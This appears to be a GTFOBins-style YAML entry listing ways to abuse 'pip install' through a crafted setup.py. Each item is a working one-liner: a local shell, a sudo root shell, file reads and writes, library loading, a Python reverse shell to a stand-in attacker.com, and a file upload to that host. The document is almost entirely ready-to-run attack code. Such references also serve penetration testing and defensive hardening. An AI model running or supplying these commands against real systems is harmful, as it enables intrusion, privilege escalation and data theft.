---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
        pip install $TF
  reverse-shell:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        TF=$(mktemp -d)
        echo 'import sys,socket,os,pty;s=socket.socket()
        s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")' > $TF/setup.py
        pip install $TF
  file-upload:
    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export URL=http://attacker.com/
        export LFILE=file_to_send
        TF=$(mktemp -d)
        echo 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
        pip install $TF
    - description: Serve files in the local folder running an HTTP server.
      code: |
        export LPORT=8888
        TF=$(mktemp -d)
        echo 'import sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
        pip install $TF
  file-download:
    - description: Fetch a remote file via HTTP GET request. It needs an absolute local file path.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=/tmp/file_to_save
        TF=$(mktemp -d)
        echo 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py
        pip install $TF
  file-write:
    - description: It needs an absolute local file path.
      code: |
        export LFILE=/tmp/file_to_save
        TF=$(mktemp -d)
        echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
        pip install $TF
  file-read:
    - description: The read file content is corrupted as wrapped within an exception error.
      code: |
        TF=$(mktemp -d)
        echo 'raise Exception(open("file_to_read").read())' > $TF/setup.py
        pip install $TF
  library-load:
    - code: |
        TF=$(mktemp -d)
        echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
        pip install $TF
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
        sudo pip install $TF
---
